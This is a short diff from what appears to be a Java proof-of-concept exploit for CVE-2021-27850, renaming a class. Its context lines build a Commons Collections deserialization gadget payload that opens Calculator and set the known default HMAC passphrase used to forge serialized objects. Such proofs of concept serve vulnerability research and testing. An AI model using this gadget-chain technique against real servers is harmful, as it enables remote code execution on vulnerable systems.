@@ -10,7 +10,7 @@ import java.io.ObjectOutputStream;
  * @author Whoopsunix
  *  CVE-2021-27850
  */
-public class PayloadMake {
+public class CVE_2021_27850 {
     public static void main(String[] args) throws Exception{
         Object object = Serializer.cc6("open -a Calculator.app");
         String HMAC_PASSPHRASE = "change this immediately";
